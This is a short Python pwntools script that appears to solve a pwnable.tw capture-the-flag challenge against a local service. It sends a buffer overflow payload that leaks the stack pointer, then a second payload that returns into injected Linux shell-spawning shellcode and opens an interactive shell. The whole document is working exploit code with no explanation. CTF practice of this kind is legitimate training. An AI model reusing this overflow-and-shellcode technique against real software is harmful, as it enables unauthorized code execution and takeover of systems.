from pwn import *

context.arch = 'i386'

host = '127.0.0.1'
port = 8888
# host = 'chall.pwnable.tw'
# port = 10000

leakesp = 0x08048087

r = remote(host, port)

payload = b'a'*20 + p32(leakesp)
r.recvuntil(':')
r.send(payload)

esp = u32(r.recv(4))
print('esp =', hex(esp))
sleep(0.1)
payload = b'a'*20 + p32(esp + 20) + asm(shellcraft.linux.sh())
r.send(payload)

r.interactive()
